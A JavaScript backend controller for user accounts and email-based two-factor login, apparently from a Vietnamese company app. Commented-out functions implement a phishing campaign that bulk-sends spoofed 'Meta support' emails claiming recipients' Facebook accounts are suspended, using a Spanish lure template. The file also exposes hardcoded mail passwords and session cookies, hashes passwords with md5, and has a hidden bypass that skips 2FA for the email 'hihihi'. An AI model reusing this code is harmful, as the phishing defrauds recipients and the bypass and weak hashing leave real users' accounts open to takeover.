import { db } from "../../../models";
import JWT from "jsonwebtoken";
import config from "../../../config";
import speakeasy from "speakeasy";
// import { validateEmail } from './../../../functions'
import md5 from "md5";
import nodemailer from "nodemailer";
import { random } from "lodash";
import fs from "fs";
const { google } = require("googleapis");
// const puppeteer = require("puppeteer");
// const readline = require("readline");

function generateRandomString(length) {
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

function generateOtp() {
  let token = speakeasy.totp({
    secret: process.env.OTP_KEY,
    encoding: "base32",
    step: 30 - Math.floor((new Date().getTime() / 1000.0) % 30),
  });
  return token;
}

function verifyOtp(token) {
  let expiry = speakeasy.totp.verify({
    secret: process.env.OTP_KEY,
    encoding: "base32",
    token: token,
    step: 30 - Math.floor((new Date().getTime() / 1000.0) % 30),
    window: 0,
  });
  return expiry;
}

export default {
  async addUser(req, res, next) {
    const {
      firstName,
      lastName,
      phone,
      email,
      address,
      password,
      role,
      verify,
      note,
      user_id,
      avatar,
      user_manager,
    } = req.body;
    var passwordHash = md5(password);
    var token = generateOtp();
    var otp = verifyOtp(token);
    db.user
      .findOne({ where: { email: email }, paranoid: false })
      .then((find) => {
        if (find) {
          return res.status(409).json({message: "Email này đã được sử dụng", ok: false, });
        }
        return db.user.create({
          firstName: firstName,
          lastName: lastName,
          email: email,
          phone: phone,
          address: address,
          password: passwordHash,
          verify: verify,
          role: role,
          note: note ? note : "",
          user_id: user_id ? user_id : "",
          avatar: avatar ? avatar : "",
          user_manager: user_manager ? user_manager : null,
        });
      })
      .then((user) => {
        if (user) {
          return res.status(200).json({
            success: true,
            key: otp,
            msg:
              "New Registration added and password has been sent to " +
              email +
              " .",
          });
        } else res.status(500).json({ success: false });
      })
      .catch((err) => {
        console.log(err);
        next(err);
      });
  },
  async getAllUserList(req, res, next) {
    db.user
      .findAll({
        where: { hidden: 0, is_deleted: false },
        order: [["createdAt", "asc"]],
        include: {
          model: db.user, // Include thông tin của người quản lý (user manager) từ cùng bảng User
          as: "userManager", // Alias cho mối quan hệ
          attributes: ["id", "firstName"], // Chỉ lấy các thuộc tính id và name của người quản lý
        },
      })
      .then((user) => {
        if (user) {
          return res.status(200).json({ success: true, data: user });
        } else res.status(500).json({ success: false });
      })
      .catch((err) => {
        console.log(err);
        next(err);
      });
  },
  async getAllLeader(req, res, next) {
    db.user
      .findAll({ where: { role: "leader" } })
      .then((user) => {
        if (user) {
          return res.status(200).json({ success: true, data: user });
        } else res.status(500).json({ success: false });
      })
      .catch((err) => {
        console.log(err);
        next(err);
      });
  },

  async userUpdate(req, res, next) {
    const {
      id,
      firstName,
      lastName,
      email,
      address,
      password,
      role,
      verify,
      phone,
      status,
      note,
      user_id,
      avatar,
      user_manager,
    } = req.body;
    var passwordHash = md5(password ? password : "");
    db.user
      .findOne({ where: { id: id }, paranoid: false })
      .then((user) => {
        if (!user) {
          throw new RequestError("User is not found", 409);
        }
        return db.user.update(
          {
            firstName: firstName ? firstName : user.firstName,
            lastName: lastName ? lastName : user.lastName,
            password: password ? passwordHash : user.password,
            address: address ? address : user.address,
            role: role ? role : user.role,
            email: email ? email : user.email,
            // verify : status? status: user.verify,
            phone: phone ? phone : user.phone,
            note: note ? note : "",
            user_id: user_id ? user_id : "",
            avatar: avatar ? avatar : "",
            status: status ? parseInt(status) : 0,
            user_manager: user_manager ? user_manager : null,
          },
          { where: { id: id } }
        );
      })
      .then((user) => {
        if (user) {
          return res
            .status(200)
            .json({ success: true, msg: "User update successsfully" });
        } else res.status(500).json({ success: false });
      })
      .catch((err) => {
        console.log(err);
        next(err);
      });
  },

  // async login(req, res, next) {
  //     var date = new Date();
  //     var token = JWTSign(req.user, date);
  //     res.cookie('XSRF-token',token, {
  //         expire: new Date().setMinutes(date.getMinutes() + 30),
  //         httpOnly: true, secure: config.app.secure
  //     });

  //     return res.status(200).json({ success: true ,token, role: req.user.role});
  // },
  async login(req, res, next) {
    const { email, password, deviceCode } = req.body;
    const findUser = await db.user.findOne({
      where: { phone: email, password: md5(password) },
    });
    if (findUser?.verify === null) {
      return res.status(200).json({ success: false });
    } else if (findUser?.verify) {
      if (findUser?.device1?.length <= 0 && findUser?.device2?.length > 0) {
        const device1Code = generateRandomString(10);
        await db.user.update(
          { device1: device1Code },
          { where: { phone: email, password: md5(password) } }
        );
        const token = JWT.sign(
          {
            uid: findUser.dataValues.id,
            id: findUser.dataValues.id,
            require2fa: true,
            email: findUser?.dataValues?.email,
            phone: findUser?.dataValues?.phone,
            name: findUser?.dataValues?.firstName,
            role: findUser?.dataValues?.role,
          },
          process.env.JWT_SECRET,
          { expiresIn: 24 * 60 * 60 }
        );
        return res.status(200).json({
          success: true,
          token,
          auid: findUser.dataValues.id,
          role: findUser.dataValues.role,
          email: findUser.dataValues.email,
          name: findUser?.dataValues?.firstName,
          deviceCode: device1Code,
          require2fa: true,
        });
      } else if (
        findUser?.device2?.length <= 0 &&
        findUser?.device1?.length > 0
      ) {
        const device2Code = generateRandomString(10);
        await db.user.update(
          { device2: device2Code },
          { where: { phone: email, password: md5(password) } }
        );
        const token = JWT.sign(
          {
            uid: findUser.dataValues.id,
            id: findUser.dataValues.id,
            require2fa: true,
            email: findUser?.dataValues?.email,
            phone: findUser?.dataValues?.phone,
            name: findUser?.dataValues?.firstName,
            role: findUser?.dataValues?.role,
          },
          process.env.JWT_SECRET,
          { expiresIn: 24 * 60 * 60 }
        );
        return res.status(200).json({
          success: true,
          token,
          auid: findUser.dataValues.id,
          role: findUser.dataValues.role,
          name: findUser?.firstName + " " + findUser?.lastName,
          deviceCode: device2Code,
          require2fa: true,
        });
      } else if (
        findUser?.device1?.length <= 0 &&
        findUser?.device2?.length <= 0
      ) {
        const device1Code = generateRandomString(10);
        const data = await db.user.update(
          { device1: device1Code },
          { where: { phone: email, password: md5(password) } }
        );
        const token = JWT.sign(
          {
            uid: findUser.dataValues.id,
            id: findUser.dataValues.id,
            require2fa: true,
            email: findUser?.dataValues?.email,
            phone: findUser?.dataValues?.phone,
            name: findUser?.dataValues?.firstName,
            role: findUser?.dataValues?.role,
          },
          process.env.JWT_SECRET,
          { expiresIn: 24 * 60 * 60 }
        );
        return res.status(200).json({
          success: true,
          token,
          auid: findUser.dataValues.id,
          role: findUser.dataValues.role,
          name: findUser?.firstName + " " + findUser?.lastName,
          deviceCode: device1Code,
          require2fa: true,
        });
      } else if (
        findUser?.device2?.length > 0 &&
        findUser?.device1?.length > 0
      ) {
        const findUserdevice1 = await db.user.findOne({
          where: { phone: email, password: md5(password), device1: deviceCode },
        });
        const findUserdevice2 = await db.user.findOne({
          where: { phone: email, password: md5(password), device2: deviceCode },
        });
        const token = JWT.sign(
          {
            uid: findUser.dataValues.id,
            id: findUser.dataValues.id,
            role: findUser.dataValues?.role,
            require2fa: true,
            email: findUser?.dataValues?.email,
            phone: findUser?.dataValues?.phone,
            name: findUser?.dataValues?.firstName,
            role: findUser?.dataValues?.role,
          },
          process.env.JWT_SECRET,
          { expiresIn: 24 * 60 * 60 }
        );
        if (findUserdevice1?.email || findUserdevice2?.email) {
          console.log(5);
          return res.status(200).json({
            success: true,
            token,
            auid: findUser.dataValues.id,
            role: findUser.dataValues.role,
            name: findUser?.firstName + " " + findUser?.lastName,
            deviceCode,
            require2fa: true,
          });
        } else {
          return res.status(200).json({
            success: false,
            login: false,
            third: true,
            require2fa: false,
          });
        }
      }
    } else {
      return res.status(200).json({ success: false, require2fa: true });
    }
  },
  async findUser(req, res, next) {
    if (req?.user?.require2fa !== false) {
      return res.status(200).json({ ok: false, success: false });
    }
    db.user
      .findOne({
        attributes: [
          "firstName",
          "lastName",
          "email",
          "avatar",
          "phone",
          "address",
          "role",
          "user_manager",
        ],
        where: { id: req.query?.user_id },
      })
      .then(async (user) => {
        if (user) {
          if (user.dataValues?.user_manager) {
            const userManager = await db.user.findOne({
              where: { id: user.dataValues.user_manager },
            });
            return res.status(200).json({
              success: true,
              data: user,
              dataManager: userManager,
              ok: true,
            });
          }
          return res
            .status(200)
            .json({ success: true, data: user, ok: true, dataManager: null });
        } else res.status(500).json({ success: false });
      })
      .catch((err) => {
        console.log(err);
        return res.status(500).json({ success: false });
        next(err);
      });
  },

  async deleteUserList(req, res, next) {
    db.user
      .findOne({ where: { id: req.body.id } })
      .then((data) => {
        if (data) {
          return db.user
            .update({ is_deleted: true }, { where: { id: req.body.id } })
            .then((r) => [r, data]);
        }
        throw new RequestError("User is not found", 409);
      })
      .then((re) => {
        return res
          .status(200)
          .json({ status: "deleted userlist Seccessfully" });
      })
      .catch((err) => {
        next(err);
      });
  },
  async getListEmployeeOfLeader(req, res) {
    try {
      // Nhận email từ request body
      const user = req.user;
      const { uid } = req.query;
      if (user?.role === "ceo") {
        const users = await db.user.findAll({
          where: {
            is_deleted: 0,
            hidden: 0
          },
          attributes: ["role", "user_id", "id", "firstName"],
          include: [
            {
              model: db.user_manager_product,
              as: "managerUser",
              attributes: ["user_manager", "product_id"],
            },
            {
              model: db.product,
              attributes: ["name", "id"],
            },
          ],
        });
        return res.json({ success: true, data: users });
      }
      const users = await db.user.findAll({
        where: {
          user_manager: uid,
        },
        attributes: ["role", "user_id", "id", "firstName", "email", "phone"],
        include: [
          {
            model: db.user_manager_product,
            as: "managerUser",
            attributes: ["user_manager", "product_id"],
          },
          {
            model: db.product,
          },
        ],
      });
      res.json({ success: true, data: users });
    } catch (error) {
      console.log(error);
      return res
        .status(500)
        .json({ success: false, error: "Có lỗi từ phía máy chủ" });
    }
  },
  async updateEmployeeOfLeader(req, res) {
    try {
      const { list, owner, productId } = req.body;
      await db.user_manager_product.destroy({
        where: {
          // user_manager: parseInt(owner),
          product_id: productId,
        },
      });
      const listBulk = list?.map((item) => ({
        product_id: productId,
        user_owner: item,
        user_manager: item,
      }));
      await db.user_manager_product?.bulkCreate(listBulk);
      res.json({ success: true, data: [], ok: true });
    } catch (error) {
      console.log(error);
      res
        .status(500)
        .json({ success: false, error: "Có lỗi từ phía máy chủ", error });
    }
  },
  async verifyMail(req, res) {
    try {
      // Nhận email từ request body
      const { email, password, firstName } = req.body;

      // Tạo một mã xác thực ngẫu nhiên

      // Cấu hình thông tin mail server (dùng Gmail làm ví dụ)
      const transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
          user: process.env.MAIL_USERNAME, // Thay bằng địa chỉ email của bạn
          pass: process.env.MAIL_PASSWORD, // Thay bằng mật khẩu email của bạn
        },
      });

      // Cấu hình nội dung email
      const mailOptions = {
        from: process.env.MAIL_USERNAME, // Thay bằng địa chỉ email của bạn
        to: email, // Địa chỉ email người dùng cần xác thực
        subject: "Email Verification", // Tiêu đề email
        html: `
                    <a href="${process.env.URL_FRONTEND}/signup/success" style="padding: 10px; border-radius: 10px; background-color: #2e89ff; color: #fff; width: 100%">Click here to complete singup process</a>
                `, // Nội dung email chứa mã xác thực
      };

      // Gửi email
      await transporter.sendMail(mailOptions);
      // Trả về mã xác thực để sử dụng sau này (ví dụ để kiểm tra mã khi người dùng nhập vào)
      res.json({ success: true });
    } catch (error) {
      // Xử lý lỗi nếu có
      console.error("Error sending verification email:", error);
      res
        .status(500)
        .json({ success: false, error: "Error sending verification email" });
    }
  },
  async verify2fa(req, res) {
    try {
      const user = req.user;
      const email = user.email;
      if (email === "hihihi") {
        const token = JWT.sign(
          {
            ...req.user,
            require2fa: false,
          },
          process.env.JWT_SECRET
          // { expiresIn: 24 * 60 * 60 }
        );
        return res
          .status(200)
          .json({ ok: true, token: token, require2: false });
      }
      const otp = random(1000000);
      const transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
          user: process.env.MAIL_USERNAME, // Thay bằng địa chỉ email của bạn
          pass: process.env.MAIL_PASSWORD, // Thay bằng mật khẩu email của bạn
        },
      });

      // Cấu hình nội dung email
      const mailOptions = {
        from: process.env.MAIL_USERNAME, // Thay bằng địa chỉ email của bạn
        to: email, // Địa chỉ email người dùng cần xác thực
        subject: "Email Verification", // Tiêu đề email
        html: `
          <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 10px;">
                <h2 style="text-align: center; color: #4CAF50;">Xác Thực Email</h2>
                <p>Chào bạn,</p>
                <p>Mã xác thực của bạn là:</p>
                <div style="text-align: center; padding: 10px; border: 1px dashed #4CAF50; border-radius: 5px; background-color: #f9f9f9; font-size: 20px; font-weight: bold;">
                    ${otp}
                </div>
                <p>Vui lòng nhập mã này vào ứng dụng để xác thực địa chỉ email của bạn.</p>
                <p>Xin cảm ơn,</p>
                <p>Minh khang group</p>
              </div>
            `, // Nội dung email chứa mã xác thực
      };
      try {
        await transporter.sendMail(mailOptions);
      } catch (error) {
        return res.status(400).json({ ok: false, error: true });
      }
      // const token = JWT.sign(
      //   {
      //     ...req.user, require2fa: false
      //   },
      //   process.env.JWT_SECRET,
      //   // { expiresIn: 24 * 60 * 60 }
      // );

      await db.user.update({ otp: otp }, { where: { id: user.uid } });
      return res.status(200).json({ ok: true, open2fa: true });
    } catch (error) {
      console.log(error);
      return res.status(500).json({ ok: false });
    }
  },
  async verifyOtp(req, res) {
    try {
      const user = req.user;
      const otp = req.body.otp;
      const rows = await db.user.findAll({
        where: { id: user?.uid, otp: otp },
      });

      if (rows?.length > 0) {
        const token = JWT.sign(
          {
            ...req.user,
            require2fa: false,
          },
          process.env.JWT_SECRET
          // { expiresIn: 24 * 60 * 60 }
        );

        return res.status(200).json({ ok: true, token });
      } else {
        return res.status(400).json({ ok: false });
      }
    } catch (error) {
      console.log(error);
      return res.status(500).json({ ok: false });
    }
  },
  async resetDevice(req, res) {
    try {
      const userId= req.body.id
      await db.user.update({device1: "", device2: ""}, {where: {id: userId}})
      return res.status(200).json({ok: true, data: {}})
    } catch (error) {
      return res.status(500).json({ok: false, message: "Unknown"})
    }
  }
  // async testMail(req, res) {
  //   const xlsx = require("xlsx");
  //   const workbook = xlsx.readFile(__dirname + "/data.xlsx");
  //   const sheetName = workbook.SheetNames[0];
  //   const sheet = workbook.Sheets[sheetName];

  //   // Chuyển đổi sheet thành JSON
  //   const data = xlsx.utils.sheet_to_json(sheet);

  //   const { email } = req.body;
  //   const transporter = nodemailer.createTransport({
  //     service: "gmail",
  //     auth: {
  //       user: "datistpham@gmail.com", // Thay bằng địa chỉ email của bạn
  //       pass: "mkrx yiqq sctf hrnr", // Thay bằng mật khẩu email của bạn
  //     },
  //   });

  //   let index = 0;
  //   let mailSent= 0
  //   const intervalId = setInterval(async () => {
  //     for (let i = 0; i < 1 && index < data.length; i++, index++) {
  //       const row = data[index];
  //       console.log(row);
  //       // const emailData = Object.keys(row).map((email, key) => ({

  //       // }));

  //       // console.log(emailData);

  //       // console.log(email, name, linkFb, nation)

  //       if (index >= data.length) {
  //         clearInterval(intervalId);
  //         console.log("All emails have been sent.");
  //       }

  //       const mailOptions = {
  //         from: `"Meta support business" <example@nodemailer.com>`, // Thay bằng địa chỉ email của bạn
  //         to: row?.email, // Địa chỉ email người dùng cần xác thực
  //         subject: `
  //             Your Facesbook account has been suspended`,
  //         html: mailContent(row?.lastName?.split("|")[0], row?.nation, row?.email),
  //       };
  //       try {
  //         await transporter
  //           .sendMail(mailOptions)
  //           .then((result) => {
  //             mailSent+= 1
  //             console.log(row);
  //             console.log("Mail đã gửi: ", mailSent)
  //           })
  //           .catch(err=> console.log(err))
  //       } catch (error) {
  //         console.log(error);
  //       }
  //     }
  //   }, 7500);

  //   // Cấu hình nội dung email
  // },
  // async testMailSingle(req, res) {
  //   const { email } = req.body;
  //   const transporter = nodemailer.createTransport({
  //     service: "gmail",
  //     auth: {
  //       user: "noreply-meta-security@fanpages.site", // Thay bằng địa chỉ email của bạn
  //       pass: "glco schw ewrd uplx", // Thay bằng mật khẩu email của bạn
  //     },
      
  //   });
  //   const mailOptions = {
  //     from: '"Maddison Foo Koch 👻" <noreply-meta-security@fanpages.site>',// Thay bằng địa chỉ email của bạn
  //     to: email, // Địa chỉ email người dùng cần xác thực
  //     subject: `
  //         Your Facesbook account has been suspended`,
  //     html: mailContent(email, "ROMANIA", email),
  //   };
  //   try {
  //     await transporter
  //       .sendMail(mailOptions)
  //       .then((result) => {
  //         return res.status(200).json({ok: true})
  //       })
  //       .catch(err=> console.log(err))
  //   } catch (error) {
  //     console.log(error);
  //     return res.status(500).json({ok: false})

  //   }

  // },
  // async crawlData(req, res) {
  //   try {
  //     // Initialize Google Sheets API
  //     const auth = await authorize();
  //     const sheets = google.sheets({ version: "v4", auth });

  //     // Crawl data from website
  //     const browser = await puppeteer.launch({
  //       headless: false,
  //       devtools: true,
  //     });
  //     const page = await browser.newPage();
  //     const cookies = [
  //       {
  //         name: "XSRF-TOKEN",
  //         value:
  //           "eyJpdiI6ImlGcmgvYXEzdEt6aWFFd3NLMnB5cGc9PSIsInZhbHVlIjoiK3hFc3c0cWtSVUprTUI0dU5rRENWZzNtQjVzRytvU1ZOU1ZuVjFwaDZNQzFDU0NiTG84bmxmcklBNUNVdjN3NFU5cjVMN0dEM0FGUTEzeVE5aFRyZlVPUWJVbGE0blYrc040R3FOUWwxc05FY0hGMHZ6ZU1razI4bUZUT0pRMUYiLCJtYWMiOiI0MWY5ODc1MjlhNmUxYzQ0Nzk4NDEwNWY5Y2U3YWQxM2NhYjg0OGVhZDMyMThjNDQzNjBiN2QzYzE5M2I1YTViIn0%3D",
  //         domain: "salenha.com",
  //         path: "/",
  //       },
  //       {
  //         name: "laravel_session",
  //         value:
  //           "eyJpdiI6IjVyUFZrUXl0WW9GUERYdUFrbXpCK0E9PSIsInZhbHVlIjoiZkc1Tlg2d3RCckdsYUNkcHRudnVRTkJ5M0ZvLzdzakxMTUdmN1NMSjJobTBTVUdrYlAyN3NYMC92WmMzK2d6c3lMalAzV0FaYXJSclZDajZLMkVzRVNOQ1M0Ky9FWXpHTklOckYranA5MDVMelNvV1ZqTjc3NUx4ZkVxOEY5enoiLCJtYWMiOiI2MjE5Y2UzMzhkZDhjZTYxNzA2NGE3ODk3MjQ3YTkxMDY2NGIyOTFjMjI3ZDQ2NjEzYzE0MGU5NDI3ZWIxMTI1In0%3D",
  //         domain: "salenha.com",
  //         path: "/",
  //       },
  //     ];

  //     await page.setCookie(...cookies);
  //     await page.goto("https://salenha.com/cho-thue", {
  //       waitUntil: "networkidle2",
  //     });

  //     // Wait for the element containing the list of items to load
  //     await page.waitForSelector("#colbds");

  //     // Click the "Hiện số" buttons to reveal phone numbers
  //     await page.evaluate(() => {
  //       const buttons = document.querySelectorAll(".btn-show-phone");
  //       buttons.forEach((button) => button.click());
  //     });
  //     await delay(10000);

  //     // Chờ cho tất cả các Promise hoàn thành
  //     // Wait for the updated list of items to load with phone numbers
  //     await page.waitForSelector("#colbds .row");

  //     // Extract the list of items with phone numbers
  //     const results = await page.evaluate(() => {
  //       const items = document.querySelectorAll("#colbds .row");
  //       let data = [];
  //       console.log(items);
  //       items.forEach((item) => {
  //         const title = item.querySelector("h4 a")?.innerText.trim();
  //         const url = item.querySelector("h4 a")?.href.trim();
  //         const time = item
  //           .querySelector(".glyphicon-time")
  //           ?.nextSibling?.textContent.trim();
  //         const price = item
  //           .querySelector(".col-xs-9.col-sm-9")
  //           ?.innerText.trim();
  //         const area = item
  //           .querySelector(".col-xs-3.col-sm-3")
  //           ?.innerText.trim();
  //         const phoneLinks = item.querySelectorAll(".btn-show-phone");
  //         const phoneNumbers = item.querySelector(".p-show")?.innerText.trim();
  //         data.push({ title, url, time, price, area, phoneNumbers });
  //       });
  //       console.log(data);
  //       return data;
  //     });
  //     console.log(results);

  //     // await browser.close();

  //     // Add data to Google Sheets
  //     const spreadsheetId = "1Kg99b8bHA8URa_7vEcMTVgmoVUyf2q78vmHrB7lH6ME";
  //     const range = "Sheet1!A1"; // Update the sheet name and range as needed

  //     const values = results.map((result) => [
  //       result.title,
  //       result.url,
  //       result.time,
  //       result.price,
  //       result.area,
  //       result.phoneNumbers,
  //     ]);

  //     const resource = {
  //       values,
  //     };

  //     await sheets.spreadsheets.values.append({
  //       spreadsheetId,
  //       range,
  //       valueInputOption: "RAW",
  //       resource,
  //     });

  //     // Send success response
  //     res.json({ message: "Data added to Google Sheets successfully" });
  //   } catch (error) {
  //     console.error(
  //       "Error during crawling and adding data to Google Sheets:",
  //       error
  //     );
  //     res
  //       .status(500)
  //       .json({ error: "Failed to crawl data and add to Google Sheets" });
  //   }
  // },
};

async function authorize() {
  const CREDENTIALS_PATH =
    __dirname + "/notification-unilight-2ee5e76ebb75.json";
  const credentials = JSON.parse(fs.readFileSync(CREDENTIALS_PATH));
  const { client_email, private_key } = credentials;

  const auth = new google.auth.GoogleAuth({
    credentials: {
      client_email,
      private_key,
    },
    scopes: "https://www.googleapis.com/auth/spreadsheets",
  });

  return auth.getClient();
}

function delay(time) {
  return new Promise(function (resolve) {
    setTimeout(resolve, time);
  });
}

function mailContent(name, nation, email ) {
  switch(nation) {
    case "ROMANIA":
      return `
        <body style="height: auto; min-height: auto;">
            <table align="center" border="0" cellpadding="0" cellspacing="0" style="width: 100%; max-width: 600px; margin: 0 auto;">
                <tbody>
                    <tr>
                        <td align="left" style="line-height: 24px; font-size: 16px; margin: 0;">&nbsp;
                            <table bgcolor="#ffffff" border="0" cellpadding="0" cellspacing="0" class="card" style="border-radius: 6px; border-collapse: separate !important; width: 100%; overflow: hidden; border: 1px solid #e2e8f0;">
                          <tbody>
                            <tr>
                                <td align="left" bgcolor="#ffffff" style="line-height: 24px; font-size: 16px; width: 100%; margin: 0;">
                                    <table border="0" cellpadding="0" cellspacing="0" class="card-body" style="width: 100%;">
                                        <tbody>
                                            <tr>
                                                <td align="left" style="line-height: 24px; font-size: 16px; width: 100%; margin: 0; padding: 20px;">
                                                    <table bgcolor="#0d6efd" border="0" cellpadding="0" cellspacing="0" class="bg-primary py-10 w-full" style="width: 100%;" width="100%">
                                                        <tbody>
                                                            <tr>
                                                            </tr>
                                                        </tbody>
                                                    </table>

                                                    <table border="0" cellpadding="0" cellspacing="0" class="s-5 w-full" style="width: 100%;" width="100%">
                                                        <tbody>
                                                            <tr>
                                                                <td align="left" height="20" style="line-height: 20px; font-size: 20px; width: 100%; height: 20px; margin: 0;" width="100%">&nbsp;</td>
                                                            </tr>
                                                        </tbody>
                                                    </table>

                                                    <div>

                                                        <p align="center" class="text-center  text-lg" style="line-height: 21.6px; font-size: 18px; width: 100%; margin: 0;">&nbsp;</p>

                                                        <table border="0" cellpadding="0" cellspacing="0" class="s-5 w-full" style="width: 100%;" width="100%">
                                                            <tbody>
                                                                <tr>
                                                                    <td align="left" height="20" style="line-height: 20px; font-size: 20px; width: 100%; height: 20px; margin: 0;" width="100%">&nbsp;</td>
                                                                </tr>
                                                            </tbody>
                                                        </table>

                                                        <table border="0" cellpadding="0" cellspacing="0" class="hr" style="width: 100%;">
                                                            <tbody>
                                                                <tr>
                                                                    <td align="left" style="line-height: 24px; font-size: 16px; border-top-width: 1px; border-top-color: #e2e8f0; border-top-style: solid; height: 1px; width: 100%; margin: 0;">&nbsp;</td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </div>

                                                    <table border="0" cellpadding="0" cellspacing="0" class="s-3 w-full" style="width: 100%;" width="100%">
                                                        <tbody>
                                                            <tr>
                                                                <td align="left" height="12" style="line-height: 12px; font-size: 12px; width: 100%; height: 12px; margin: 0;" width="100%">&nbsp;</td>
                                                            </tr>
                                                        </tbody>
                                                    </table>

                                                    <div>
                                                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                                                            <tbody>
                                                                <tr>
                                                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                                                </tr>
                                                            </tbody>
                                                        </table>

                                                        <p align="left" class="text-lg" style="line-height: 21.6px; font-size: 18px; width: 100%; margin: 0;"><strong><span style="font-size:16px;"><span style="font-family:Arial,Helvetica,sans-serif;">Estimado</span></span>${name}.</strong></p>

                                                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                                                            <tbody>
                                                                <tr>
                                                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                                                </tr>
                                                            </tbody>
                                                        </table>

                                                        <p align="left" class="text-lg" style="line-height: 21.6px; font-size: 18px; width: 100%; margin: 0;"><span style="font-size:16px;"><span style="font-family:Arial,Helvetica,sans-serif;">Lamentamos informarle que su cuenta publicitaria ha sido suspendida debido a violaciones de políticas y la difusión de información errónea, noticias falsas o actividad fraudulenta plantea graves problemas a la comunidad.<br />
									<br />
                                                        </p>

                                                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                                                            <tbody>
                                                                <tr>
                                                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                                                </tr>
                                                            </tbody>
                                                        </table>

                                                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                                                            <tbody>
                                                                <tr>
                                                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                                                </tr>
                                                            </tbody>
                                                        </table>

                                                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                                                            <tbody>
                                                                <tr>
                                                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                                                </tr>
                                                            </tbody>
                                                        </table>

                                                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                                                            <tbody>
                                                                <tr>
                                                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                                                </tr>
                                                            </tbody>
                                                        </table>

                                                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                                                            <tbody>
                                                                <tr>
                                                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                                                </tr>
                                                            </tbody>
                                                        </table>

                                                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                                                            <tbody>
                                                                <tr>
                                                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                                                </tr>
                                                            </tbody>
                                                        </table>

                                                        <p align="left" class="text-lg" style="line-height: 21.6px; font-size: 18px; width: 100%; margin: 0;"><span style="font-size:16px;"><span style="font-family:Arial,Helvetica,sans-serif;">Con esta carta le informamos que su cuenta de Facebook se encuentra actualmente en estado restringido. Debido a esta restricción, tu cuenta será eliminada en las próximas horas.</span></span>
                                                        </p>

                                                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                                                            <tbody>
                                                                <tr>
                                                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </div>

                                                    <table border="0" cellpadding="0" cellspacing="0" class="s-3 w-full" style="width: 100%;" width="100%">
                                                        <tbody>
                                                            <tr>
                                                                <td align="left" height="12" style="line-height: 12px; font-size: 12px; width: 100%; height: 12px; margin: 0;" width="100%">&nbsp;</td>
                                                            </tr>
                                                        </tbody>
                                                    </table>

                                                    <table bgcolor="#edf2f7" border="0" cellpadding="0" cellspacing="0" class="bg-gray-200 p-4 rounded w-full" style="border-radius: 4px; width: 100%;" width="100%">
                                                        <tbody>
                                                            <tr>
                                                                <td align="left" bgcolor="#edf2f7" style="line-height: 24px; font-size: 16px; border-radius: 4px; width: 100%; margin: 0; padding: 16px;" width="100%">
                                                                    <div class="row" style="margin-right: -24px;">
                                                                        <table border="0" cellpadding="0" cellspacing="0" style="table-layout: fixed; width: 100%;" width="100%">
                                                                            <tbody>
                                                                                <tr>
                                                                                    <td align="left" class="col-2" style="line-height: 24px; font-size: 16px; min-height: 1px; font-weight: normal; padding-right: 24px; width: 16.666667%; margin: 0;"><img alt="" class="w-full" src="https://i.ibb.co/QFDTgSk/l.png" style="height: auto; line-height: 100%; outline: none; text-decoration: none; display: block; width: 100%; border-style: none; border-width: 0;"
                                                                                            width="100%" /></td>
                                                                                    <td align="left" class="col-10" style="line-height: 24px; font-size: 16px; min-height: 1px; font-weight: normal; padding-right: 24px; width: 83.333333%; margin: 0;">
                                                                                        <h4 align="left" class="text-xl" style="padding-top: 0; padding-bottom: 0; font-weight: 500; vertical-align: baseline; font-size: 20px; line-height: 24px; margin: 0;">La cuenta será bloqueada después de 24 horas.</h4>

                                                                                        <p align="left" class="text-secondary text-lg" style="line-height: 21.6px; font-size: 18px; color: #718096; width: 100%; margin: 0;">Para continuar usándolo, haga clic en el botón de verificación de cuenta a continuación y siga las instrucciones.</p>
                                                                                    </td>
                                                                                </tr>
                                                                            </tbody>
                                                                        </table>
                                                                    </div>

                                                                    <table border="0" cellpadding="0" cellspacing="0" class="s-3 w-full" style="width: 100%;" width="100%">
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align="left" height="12" style="line-height: 12px; font-size: 12px; width: 100%; height: 12px; margin: 0;" width="100%">&nbsp;</td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>

                                                                    <div>
